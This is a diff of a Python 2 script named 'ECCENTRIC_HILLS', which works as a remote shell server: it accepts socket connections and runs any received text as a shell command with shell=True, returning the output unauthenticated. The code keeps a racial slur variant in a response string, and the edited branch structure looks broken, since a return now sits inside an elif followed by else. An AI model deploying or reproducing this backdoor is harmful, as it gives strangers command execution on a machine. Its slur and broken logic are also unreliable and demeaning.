@@ -1,5 +1,5 @@
 #ECCENTRIC_HILLS - *NIX Server Deployment Binary
-#Written by Gunnar Jones - gunSec
+#Written by Gunnar Jones - @gunSec and Austin Crinkaw - @acrinklaw
 #https://github.com/acrinklaw/eccentric_hills
 #grabbing our libraries
 import socket
@@ -26,12 +26,13 @@ def commands(command):
 STDOUT, shell=True)
         except:
             result = "Failed to execute command.\n"
+
     elif command[0] == "!":
         command = command[1:]
         result = "nibba punch"
-    return result
+        return result
+
     else:
-        print "\nNgr wtf did you do, this should literally be impossible to call\n"
         sys.exit(1)
 
 #main server functions, command parsing
@@ -40,14 +41,18 @@ def shell(clientSocket):
         clientSocket.send("\n^-^")
         buffer = ""
         while "\n" not in buffer:
+            clientSocket.send("Waiting for command")
             buffer += clientSocket.recv(4096)
+
         if buffer == 'quit':
             clientSocket.send("[*] Terminating Connection. Goodbye.")
             clientSocket.close()
             break
+
+        #TODO: This breaks this script still, figure out why
         elif buffer == "\n":
-            print ""
             continue
+
         else:
             output = commands(buffer)
             clientSocket.send(output)
@@ -59,6 +64,7 @@ def handleClient(clientSocket):
         #send the w and uname to client, jump to shell loop
         clientSocket.send("\n[+] Accepted Connection\n")
         shell(clientSocket)
+
     else:
         clientSocket.close()
 
